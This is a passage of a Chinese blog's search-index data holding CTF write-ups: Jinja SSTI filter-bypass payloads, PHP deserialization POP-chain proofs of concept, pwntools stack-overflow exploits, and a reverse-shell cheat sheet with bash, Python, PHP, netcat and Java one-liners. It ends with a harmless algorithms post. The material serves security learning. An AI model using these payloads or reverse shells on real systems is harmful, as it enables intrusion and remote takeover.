lipsum.__globals__.os.popen('cat /flag').read() Web367过滤了os，继续参数逃逸 1?name={{(lipsum|attr(request.values.a))|attr(request.values.b)}}&amp;a=__globals__&amp;b=os.popen('cat /flag').read() 由于attr获取属性，所以使用这段payload没有回显，应该用以下这段payload 1?name={{(lipsum|attr(request.values.c)).get(request.values.a).popen(request.values.b).read()}}&amp;a=os&amp;b=cat /flag&amp;c=__globals__ Web368过滤了花括号，那就使用\"{%%}\"来执行python语句 1?name={%print((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read())%}&amp;a=__globals__&amp;b=os&amp;c=cat /flag Web369后面题目比较刁钻，有空再更新 一点小插曲Hexo使用Nunjucks这个模板引擎，同样使用\"{{}}\"和\"{%%}\"来包裹变量，因此在写完这篇博客进行上传操作时，hexo出现了报错，可谓是SSTI现身说法了。 解决方法：https://blog.csdn.net/Calvin_zhou/article/details/109303640 8.19不知道为什么之前的md没有保存，又出现了渲染错误。","link":"/2023/07/29/SSTI/"},{"title":"PHP反序列化与一些例题","text":"PHP反序列化与一些例题反序列化函数触发条件 题目一 空变量绕过source1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phphighlight_file(__FILE__);class ease{ private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct(){ if (in_array($this-&gt;method, array(&quot;ping&quot;))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);# 2 } } function ping($ip){ exec($ip, $result); # 1 var_dump($result); } function waf($str){ if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/&quot;, $str, $pat_array)) { return $str; } else { echo &quot;don't hack&quot;; } } function __wakeup(){ foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = $this-&gt;waf($v); } } }$ctf=@$_POST['ctf'];@unserialize(base64_decode($ctf));?&gt; poc123456789101112&lt;?phpclass ease{ private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; }}$a = new ease(&quot;ping&quot;, array(&quot;ca$@t\\$IFS$9`find`&quot;));echo base64_encode(serialize($a));?&gt; $@空变量 $IFS$9空格 find命令查看当前及子目录下的所有文件 题目二 绕过正则匹配/[oc]:\\d+/i12345if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } 利用加号绕过 1O:+4......略 题目三 pop链source1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?phperror_reporting(0);//flag is in f14g.phpclass Popuko { private $No_893; public function POP_TEAM_EPIC(){ $WEBSITE = &quot;MANGA LIFE WIN&quot;; } // 1、__invoke 当以函数的方式调用对象实例的时候触发 // $this-&gt;No_893 = php://filter/read/convert.base64-encode/resource=f14g.php public function __invoke(){ $this-&gt;append($this-&gt;No_893); } public function append($anti_takeshobo){ // 终点 include($anti_takeshobo); }}class Pipimi{ public $pipi; public function PIPIPMI(){ $h = &quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;; } public function __construct(){ echo &quot;Pipi美永远不会生气ww&quot;; $this-&gt;pipi = array(); } // 2.此处当作函数执行 也就是 $this-&gt;p=new Popuko(); // __get 当访问不可访问或者不存在的属性是触发 public function __get($corepop){ $function = $this-&gt;p; return $function(); }}class Goodsisters{ public function PopukoPipimi(){ $is = &quot;Good sisters&quot;; } public $kiminonawa,$str; public function __construct($file='index.php'){ $this-&gt;kiminonawa = $file; echo 'Welcome to HNCTF2022 ,'; echo 'This is '.$this-&gt;kiminonawa.&quot;&lt;br&gt;&quot;; } // 3.此处当作访问不存在的属性（Pipimi类的） 也就是 $this-&gt;str=new Pipimi(); // Pipimi类中并不存在kiminonawa // __toString 以字符串方式调用对象实例触发 public function __toString(){ return $this-&gt;str-&gt;kiminonawa; } // 4.此处$this-&gt;kiminonawa触发 $this-&gt;kiminonawa=new Goodsisters(); public function __wakeup(){ if(preg_match(&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\\.\\./i&quot;, $this-&gt;kiminonawa)) { echo &quot;仲良ピース!&quot;; $this-&gt;kiminonawa = &quot;index.php&quot;; } }}if(isset($_GET['pop'])) @unserialize($_GET['pop']); else{ $a=new Goodsisters; if(isset($_GET['pop_EP']) &amp;&amp; $_GET['pop_EP'] == &quot;ep683045&quot;){ highlight_file(__FILE__); echo '欸嘿,你也喜欢pop子~对吧ww'; }} poc12345678910111213141516171819202122&lt;?php//flag is in f14g.phpclass Popuko { private $No_893; public function __construct(){ $this -&gt; No_893 = &quot;php://filter/read/convert.base64-encode/resource=f14g.php&quot;; }}class Pipimi{ public $p; }class Goodsisters{ public $kiminonawa, $str;}$a = new Goodsisters();$b = new Pipimi();$c = new Popuko();$a -&gt; kiminonawa = $a;$a -&gt; str = $b;$b -&gt; p = $c;echo urlencode(serialize($a)); pop链，步步为营，触发下一个函数 题目四 字符串逃逸（增多）source123456789101112131415161718192021222324&lt;?phpfunction waf($str){ return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);}class GetFlag { public $key; public $cmd = &quot;whoami&quot;; public function __construct($key) { $this-&gt;key = $key; } public function __destruct() { system($this-&gt;cmd); }}//&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}//badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}//字符串逃逸$b = waf(serialize(new GetFlag($key='badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;}')));unserialize($b); 每一个bad转化为good会增加一个字符的空间，可以通过waf()修改类的属性，需要增加的字符数和bad的个数相等 题目六 快速反序列化 fast __destruct()source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phphighlight_file(__FILE__);class Start{ public $errMsg; public function __destruct() { die($this-&gt;errMsg); }}class Pwn{ public $obj; public function __invoke(){ $this-&gt;obj-&gt;evil(); } public function evil() { phpinfo(); }}class Reverse{ public $func; public function __get($var) { ($this-&gt;func)(); }}class Web{ public $func; public $var; public function evil() { if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var)){ ($this-&gt;func)($this-&gt;var); }else{ echo &quot;Not Flag&quot;; } }}class Crypto{ public $obj; public function __toString() { $wel = $this-&gt;obj-&gt;good; return &quot;NewStar&quot;; }}class Misc{ public function evil() { echo &quot;good job but nothing&quot;; }}$a = @unserialize($_POST['fast']);throw new Exception(&quot;Nope&quot;); pop链很清晰 12345678$a = new Start();$a-&gt;errMsg = new Crypto();$a-&gt;errMsg-&gt;obj = new Reverse();$a-&gt;errMsg-&gt;obj-&gt;func = new Pwn();$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = new Web();$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;func=&quot;system&quot;;$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;var=&quot;cat /fl$@ag&quot;; // 过滤了flag 空变量绕过即可echo serialize($a); 刚开始看题意还以为是条件竞争，写了个爆破脚本( 后来发现题目的意思是fast __destruct(), unserialize()出来的对象，如果赋值给了一个变量，那么这个对象的析构函数会到程序结束时执行，因此在这道题中无法绕过最后的异常抛出。如果单独执行unserialize()函数，那么反序列化出来的对象会在这条语句结束后立刻销毁。 这道题需要我们快速执行__destruct()函数进行命令执行，我们可以把末尾的}去掉一个 本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的__destruct(),提前触发反序列化链条 1O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fl$@ag&quot;;}}}}} 最后的payload 1O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fl$@ag&quot;;}}}} PHP反序列化冷知识","link":"/2023/10/15/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"pwnstack0x00","text":"栈溢出0x00buuctf前四题作为入门题 test_your_nc测试nc的水题，略 ripget函数栈溢出 12345from pwn import *r = remote('','')payload = 'A'* 32 + p64(0x401186)r.sendline(payload)r.interactive() warmup_csaw_2016 gets()函数说明有栈溢出漏洞 1234int sub_40060D(){ return system(&quot;cat flag.txt&quot;);} 调用这个函数可以获得flag，地址是0x40060D 1234v5变量-0000000000000040 var_40 db 64 dup(?)+0000000000000000 s db 8 dup(?)+0000000000000008 r db 8 dup(?) 所以要填充(0x40 + 8)个字符 exp12345from pwn import *r = remote('node4.buuoj.cn', '27115')payload = b'a' * (0x40 + 8) + p64(0x40060D)r.sendline(payload)r.interactive() ciscn_2019_n_1还是一道基础的栈溢出题，没开栈溢出保护 123456789101112131415int func(){ int result; // eax char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(&quot;Let's guess the number.&quot;); gets(v1); if ( v2 == 11.28125 ) result = system(&quot;cat /flag&quot;); else result = puts(&quot;Its value should be 11.28125&quot;); return result;} 这题应该是用v1溢出修改v2中的值，使得v2 == 11.28125 v1在函数栈中占据(0x30 - 0x04)的大小，v2占据0x04的大小 为什么伪代码注释中是[rbp - 30h]? 这是因为栈在内存中是从高地址朝低地址生长的，rbp是栈底指针 回归正题，把鼠标放到dword_4007F4就可以看到11.28125的16进制数值为0x41348000 exp12345from pwn import *r = remote('node4.buuoj.cn', '27277')payload = b'a' * (0x30 - 0x04) + p64(0x41348000)r.sendline(payload)r.interactive()","link":"/2023/10/20/pwnstack0x00/"},{"title":"反弹Shell","text":"反弹Shell1 正向连接1.1 应用场景被控端端口无限制，存在命令执行漏洞 1.2 操作指令1.2.1 被控端为Linux系统1234# 被控端Linuxnc -lvp -e [port(8888)] /bin/bash# 控制端nc [ip] [port(8888)] 1.2.2 被控端为Windows系统1234# 被控端Windownc -lvp [port(8888)] -e powershell# 控制端nc [ip] [port(8888)] 2 反向连接（常用）2.1 应用场景需要控制端链接到公网ip 2.2 操作指令2.2.1 被控端为Linux系统1234# 控制端nc -lvp 8888# 被控端nc [公网ip] 8888 -e /bin/bash 2.2.2 被控端为Windows1234# 控制端nc -lvp 8888# 被控端nc [公网ip] 8888 -e powershell 2.3 反向连接命令(记得改一下IP和端口)Bash 1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 Python 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' PHP 1php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);' Netcat 1nc -e /bin/sh 10.0.0.1 1234 Java 123r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() 更多命令 例题 [CISCN 2023 华北]pysym源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445from flask import Flask, render_template, request, send_from_directoryimport osimport randomimport stringapp = Flask(__name__)app.config['UPLOAD_FOLDER']='uploads'@app.route('/', methods=['GET'])def index(): return render_template('index.html')@app.route('/',methods=['POST'])def POST(): if 'file' not in request.files: return 'No file uploaded.' file = request.files['file'] if file.content_length &gt; 10240: return 'file too lager' path = ''.join(random.choices(string.hexdigits, k=16)) directory = os.path.join(app.config['UPLOAD_FOLDER'], path) os.makedirs(directory, mode=0o755, exist_ok=True) savepath=os.path.join(directory, file.filename) file.save(savepath) try: os.system('tar --absolute-names -xvf {} -C {}'.format(savepath,directory)) except: return 'something wrong in extracting' links = [] for root, dirs, files in os.walk(directory): for name in files: extractedfile =os.path.join(root, name) if os.path.islink(extractedfile): os.remove(extractedfile) return 'no symlink' if os.path.isdir(path) : return 'no directory' links.append(extractedfile) return render_template('index.html',links=links)@app.route(&quot;/uploads/&lt;path:path&gt;&quot;,methods=['GET'])def download(path): filepath = os.path.join(app.config['UPLOAD_FOLDER'], path) if not os.path.isfile(filepath): return '404', 404 return send_from_directory(app.config['UPLOAD_FOLDER'], path)if __name__ == '__main__': app.run(host='0.0.0.0',port=1337) savepath的值是可控的 很明显的命令执行漏洞，利用文件名命令执行 1os.system('tar --absolute-names -xvf {} -C {}'.format(savepath,directory)) 12#payloadtest.txt || echo Your_Reverse_Shell_Code | base64 -d | bash ;","link":"/2023/11/18/%E5%8F%8D%E5%BC%B9shell/"},{"title":"基础算法0x00 回溯_Dfs","text":"基础算法0x00 回溯_Dfs开个新坑，记录一下基础算法的学习，顺便准备一下明年的蓝桥杯，整整300大米呢:smile: 参考灵神的视频以及自己做的题，把最近一周写的dfs题分为三类，一类是子集型回溯，一类是组合型回溯，一类是矩阵上的回溯 回溯三问 边界条件是什么？ 子问题是什么？ 当前操作要做什么？ 想对这三个问题，回溯类的题目就很好解决了。 也可以通过画树状图的方式来思考回溯问题 子集型回溯题目Leetcode 78 子集Ⅰ78. 子集Ⅰ 可以从两种角度看这道题 一、选或不选从选或者不选角度来看 1234567891011121314151617//nums = [1, 2, 3]vector&lt;vector&lt;int&gt;&gt; ans;vector&lt;int&gt; path;void dfs(int i, vector&lt;int&gt;&amp; nums){ int n = nums.size(); if (i == n){ return; } // 不选 dfs(i+1, nums); // 选 // 状态保存 path.emplace_back(nums[i]); dfs(i+1, nums); // 状态恢复 path.pop_back();} 二、选哪个数从选择哪个数的角度来看 1234567891011121314vector&lt;vector&lt;int&gt;&gt; ans;vector&lt;int&gt; path;void dfs(int i, vector&lt;int&gt;&amp; nums){ int n = nums.size(); if (i == n){ return; } for (int j = i; j &lt; n; j++){ path.emplace_back(nums[j]); ans.emplace_back(path); dfs(j + 1, nums); path.pop_back(); }} 主函数中需要先处理好空集 Leetcode 90 子集Ⅱ90. 子集 II 和第一题的区别在于引入了重复元素，会导致答案出现重复，因此需要引入剪枝操作，剔除重复元素。 1234567891011121314void dfs(int i, vector&lt;int&gt;&amp; nums){ int n = nums.size(); if (i == n){ return; } for (int j = i; j &lt; n; j++){ if (j &gt; i &amp;&amp; nums[j] == nums[j - 1]) continue; path.emplace_back(nums[j]); ans.emplace_back(path); dfs(j + 1, nums); path.pop_back(); }} 组合型回溯题目Leetcode 39 组合总数39. 组合总和 首先对数组进行排序，在遍历过程中加上一个判断即可进行剪枝，如果当前元素加入组合后无法满足条件，那么后面的元素更无法满足，可以break返回。 边界条件：当路径内所有数字求和后等于target即到达边界 12345678910111213141516vector&lt;vector&lt;int&gt;&gt; ans;vector&lt;int&gt; path;void dfs(vector&lt;int&gt;&amp; candidates, int target, int i){ if (target == 0){ ans.emplace_back(path); return; } for (int j = i; j &lt; candidates.size(); j++){ if (target - candidates[i] &lt; 0){ break; } path.emplace_back(candidates[j]); dfs(candidates, target - candidates[j], j); path.pop_back(); }} 矩阵上的dfs题目Leetcode 200 岛屿数量200. 岛屿数量 经典的图论dfs，遍历矩阵中的每一个点，如果是陆地就ans++，同时以这个点为起点进行深度优先搜索，将所有经过的点标记为’0’，避免重复计数，最后按照上右下左的顺序进入下一层。 12345678910111213141516171819202122232425class Solution {public: int numIslands(vector&lt;vector&lt;char&gt;&gt;&amp; grid) { int m = grid.size(), n = grid[0].size(), ans = 0; function&lt;void(int, int)&gt; dfs = [&amp;](int i, int j){ if (i &lt; 0 || i &gt; m - 1 || j &lt; 0 || j &gt; n - 1 || grid[i][j] == '0'){ return; } grid[i][j] = '0'; dfs(i-1,j); dfs(i,j+1); dfs(i+1,j); dfs(i,j-1); }; for (int i = 0; i &lt; m; i++){ for (int j = 0; j &lt; n; j++){ if (grid[i][j] == '1'){ ans++; dfs(i, j); } } } return ans; }}; Leetcode 79 单词搜索79. 单词搜索 同样也是在矩阵上搜索，相比上一道海岛统计，这道题需要使用状态恢复，因为从下一个点开始的搜索依然要搜索这些点。 12345678910111213141516171819202122232425class Solution {public: bool exist(vector&lt;vector&lt;char&gt;&gt;&amp; board, string word) { int m = board.size(), n = board[0].size(); function&lt;bool(int, int, int)&gt; dfs = [&amp;](int i, int j, int k){ if (k == word.length()){ return true; } if (i &lt; 0 || j &lt; 0 || i &gt; m - 1 || j &gt; n - 1 || board[i][j] != word[k]){ return false; } board[i][j] = '\\0'; bool res = dfs(i-1,j,k+1) || dfs(i,j+1,k+1) || dfs(i+1,j,k+1) || dfs(i,j-1,k+1); board[i][j] = word[k]; return res; }; for (int i = 0; i &lt; m; i++){ for (int j = 0; j &lt; n; j++){ if (dfs(i, j, 0)) return true; } } return false; }}; Leetcode 51 N皇后51. N 皇后 烧鸡100题里面唯一一道回溯困难，一年前很难写出完整的代码，现在轻松拿下。 把每一行都单独拿出来，在这一行中遍历每一列寻找可以防止皇后的点位，这就是子问题，引入valid(i, j)函数判断是否可以合法放置皇后。 valid(i, j)函数遍历之前的i - 1行，检查是否会被之前放置的皇后攻击。最后记得状态恢复。 123456789101112131415161718192021222324252627282930class Solution {public: vector&lt;vector&lt;string&gt;&gt; solveNQueens(int n) { vector&lt;string&gt; chess(n, string(n,'.')); vector&lt;vector&lt;string&gt;&gt; ans; function&lt;bool(int, int)&gt; valid = [&amp;](int i, int j){ // 检查第i行 第j列是否可以放皇后 // 检查列和两条对角线 for (int k = 0; k &lt; i; k++){ if (chess[k][j] == 'Q' || (k-i+j &gt;= 0 &amp;&amp; k-i+j &lt; n &amp;&amp; chess[k][k-i+j] == 'Q') || (i+j-k &gt;= 0 &amp;&amp; i+j-k &lt; n &amp;&amp; chess[k][i+j-k] == 'Q')) return false; } return true; }; function&lt;void(int)&gt; dfs = [&amp;](int i){ if (i == n){ ans.emplace_back(chess); return; } for (int j = 0; j &lt; n; j++){ if (valid(i, j)){ chess[i][j] = 'Q'; dfs(i+1); chess[i][j] = '.'; } } }; dfs(0); return ans; }};","link":"/2023/12/27/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%950x00%20%E5%9B%9E%E6%BA%AF_Dfs/"}],"tags":[{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"DASCTF","slug":"DASCTF","link":"/tags/DASCTF/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Pwn","slug":"Pwn","link":"/tags/Pwn/"},{"name":"基础算法","slug":"基础算法","link":"/tags/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/"}],"categories":[],"pages":[]}